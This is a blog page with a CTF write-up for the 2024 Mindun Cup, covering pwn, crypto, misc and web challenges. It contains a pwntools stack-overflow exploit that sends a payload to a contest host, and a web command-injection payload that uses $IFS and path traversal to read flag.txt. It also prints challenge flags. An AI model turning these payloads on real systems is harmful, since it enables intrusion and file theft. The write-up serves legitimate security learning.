@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/cover.jpg">
+    <meta property="twitter:image" content="img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="2024闽盾杯WriteUp" />
+    <meta property="og:title" content="2024闽盾杯WriteUp" />
+    <meta property="twitter:title" content="2024闽盾杯WriteUp" />
+    
+
+    
+    <meta name="description" content="2024闽盾杯的部分wp">
+    <meta property="og:description" content="2024闽盾杯的部分wp" />
+    <meta property="twitter:description" content="2024闽盾杯的部分wp" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, Zephyr, Zephyr, , Zephyr的网络日志, Zephyr的博客, Zephyr Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>2024闽盾杯WriteUp | Zephyr的博客 | Zephyr Blog | Zephyr#3 | #3 |</title>
+
+    <link rel="canonical" href="/ctfmindunbei/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/life//">LIFE</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/writeup" title="WriteUp">
+                            WriteUp
+                        </a>
+                        
+                    </div>
+                    <h1>2024闽盾杯WriteUp</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Sunday, June 23, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="pwn">Pwn</h1>
+<h2 id="licensepwn">licensePWN</h2>
+<p>挖个漏洞获取管理员的权限和数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>fscanf(v1, <span style="color:#f1fa8c">&#34;%s&#34;</span>, v6);
+</span></span></code></pre></div><p>存在栈溢出，进到 <code>sub_4012F0</code> 函数中eip可控，题目中要求</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( v3 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">999</span> )
+</span></span><span style="display:flex;"><span>    sub_401340();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span></code></pre></div><p>没开pie，把后门函数地址 <code>401340</code> 塞eip里然后拿到flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>from pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;112.50.92.5&#34;</span>,<span style="color:#bd93f9">12523</span>)
+</span></span><span style="display:flex;"><span>context.log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>back_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401340</span>
+</span></span><span style="display:flex;"><span># payload <span style="color:#ff79c6">=</span> (b<span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> len(<span style="color:#f1fa8c">&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>)  <span style="color:#ff79c6">+</span> p32(back_addr))
+</span></span><span style="display:flex;"><span># # 打开文件，以二进制写入模式
+</span></span><span style="display:flex;"><span># <span style="color:#8be9fd;font-style:italic">with</span> open(<span style="color:#f1fa8c">&#34;license.txt&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) as file<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>#     # 写入前面的 <span style="color:#f1fa8c">&#39;a&#39;</span> 字符
+</span></span><span style="display:flex;"><span>#     file.write(b<span style="color:#f1fa8c">&#39;a&#39;</span> <span style="color:#ff79c6">*</span> len(<span style="color:#f1fa8c">&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>#     # 写入特定的字节序列 <span style="color:#bd93f9">40</span> <span style="color:#bd93f9">13</span> <span style="color:#bd93f9">40</span> <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>#     file.write(b<span style="color:#f1fa8c">&#39;\x40\x13\x40\x00&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># print(<span style="color:#f1fa8c">&#34;Payload 已写入到 license.txt 文件中&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># 读取文件内容并转换为十六进制字符串
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">with</span> open(<span style="color:#f1fa8c">&#34;license.txt&#34;</span>, <span style="color:#f1fa8c">&#34;rb&#34;</span>) as file<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    file_content <span style="color:#ff79c6">=</span> file.read()
+</span></span><span style="display:flex;"><span>    hex_payload <span style="color:#ff79c6">=</span> file_content.hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(hex_payload)
+</span></span><span style="display:flex;"><span>p.sendlineafter(<span style="color:#f1fa8c">&#34;Send me a license file(Hex string):&#34;</span>,hex_payload)
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><h1 id="crypto">Crypto</h1>
+<h2 id="签到题">签到题</h2>
+<p>SM3加密
+<code>a88a5d3b7c7721d307a29c0d959950ac921ac7da00a436c6faad3b94e16615c5</code></p>
+<h2 id="我的进制我做主">我的进制我做主</h2>
+<p>对文件字符串去重 <code>ergdgjboglfpgcbpbofmgafhfngpfoflfpfkgjgccndcfqfpgcgofofpdadadagr</code></p>
+<p>得到 <code>fgpdocabrjlnemhkq</code></p>
+<p>然后减去 <code>a</code></p>
+<p>得到关系表，比如这里<code>f</code>在字母表顺序中就是5，然后将原始的字符串转换一下，再两两为一组按照18进制解码即可。</p>
+<blockquote>
+<p>18进制想不到的话可以用爆破的方法来求解，直至能解出来为止。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f1fa8c">&#39;f&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">5</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;g&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">6</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;p&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">15</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;d&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">3</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;o&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">14</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;c&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">2</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;b&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;r&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">17</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;j&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">9</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;l&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">11</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;n&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">13</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;e&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">4</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;m&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">12</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;h&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">7</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;k&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">10</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;q&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">16</span>}
+</span></span></code></pre></div><p>然后将字符串两两一组</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;fgpdocabrjlnemhkq&#34;</span>
+</span></span><span style="display:flex;"><span>ci <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ergdgjboglfpgcbpbofmgafhfngpfoflfpfkgjgccndcfqfpgcgofofpdadadagr&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diction <span style="color:#ff79c6">=</span> {char: <span style="color:#8be9fd;font-style:italic">ord</span>(char) <span style="color:#ff79c6">-</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">for</span> char <span style="color:#ff79c6">in</span> c}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blocks <span style="color:#ff79c6">=</span> [ci[i:i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(ci), <span style="color:#bd93f9">2</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">chr</span>(diction[high] <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">18</span> <span style="color:#ff79c6">+</span> diction[low])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> high, low <span style="color:#ff79c6">in</span> blocks
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(res)
+</span></span></code></pre></div><p><code>You win! flag{heidun18jinzhi666}</code></p>
+<h1 id="misc">MISC</h1>
+<h2 id="logo">logo</h2>
+<p>用Stegsolveb0通道可以看到<code>flag{zhss_c79a_Ccp7_4Zc9}</code></p>
+<h2 id="学会office">学会Office</h2>
+<p>写pandas</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span># 读取Excel文件
+</span></span><span style="display:flex;"><span>file_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;学生考试成绩单.xls&#39;</span>  # 替换为你的Excel文件路径
+</span></span><span style="display:flex;"><span>excel_data <span style="color:#ff79c6">=</span> pd.read_excel(file_path, None)  # 读取所有sheet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># 遍历所有sheet并打印内容
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> sheet_name, sheet_data <span style="color:#ff79c6">in</span> excel_data.items()<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#f1fa8c">&#34;Sheet: {sheet_name}&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(sheet_data)
+</span></span></code></pre></div><p>有隐藏列</p>
+<p>全选之后 在格式里面取消隐藏列 得到f1ag</p>
+<p>得到如下字符串  <code>iojm~qmlfklvhxdqjxdehlvlptmjlldsdggwllhmqlq€ljqmqjrqddjfnddqlvrxeloh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Sub jiemi()
+</span></span><span style="display:flex;"><span>    Dim x As Long, data As String, tmp As String
+</span></span><span style="display:flex;"><span>    For x <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span> To <span style="color:#bd93f9">99</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> Trim(ActiveSheet<span style="color:#ff79c6">.</span>Range(<span style="color:#f1fa8c">&#34;I&#34;</span> <span style="color:#ff79c6">&amp;</span> x))
+</span></span><span style="display:flex;"><span>        If data <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span> Then Exit For
+</span></span><span style="display:flex;"><span>        tmp <span style="color:#ff79c6">=</span> Left(data, <span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> Right(data, Len(data) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>        ActiveSheet<span style="color:#ff79c6">.</span>Range(<span style="color:#f1fa8c">&#34;I&#34;</span> <span style="color:#ff79c6">&amp;</span> x) <span style="color:#ff79c6">=</span> Chr(Asc(tmp) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">&amp;</span> data
+</span></span><span style="display:flex;"><span>    Next x
+</span></span><span style="display:flex;"><span>    MsgBox <span style="color:#f1fa8c">&#34;完成，请查看该列内容！&#34;</span>
+</span></span><span style="display:flex;"><span>End Sub
+</span></span></code></pre></div><p>解密之后，按照计算机降序排列</p>
+<p>解密，然后按计算机成绩降序排列</p>
+<h1 id="web">Web</h1>
+<h2 id="你懂fuzz吗">你懂fuzz吗</h2>
+<p><code>arjun</code>爆破参数，发现参数<code>word</code>，用burpsuite爆破值。
+
+  <img src="image.png" alt="alt text">
+
+</p>
+<p>换成<code>get</code>方法继续用<code>arjun</code>爆破，参数为<code>key</code>，用<code>$IFS</code>绕过空格过滤 然后<code>?key=cat$IFS../../../../../flag.txt</code></p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/mips/" data-toggle="tooltip" data-placement="top" title="MIPS笔记">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/course" title="course">
+                            course
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/crypto" title="crypto">
+                            crypto
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
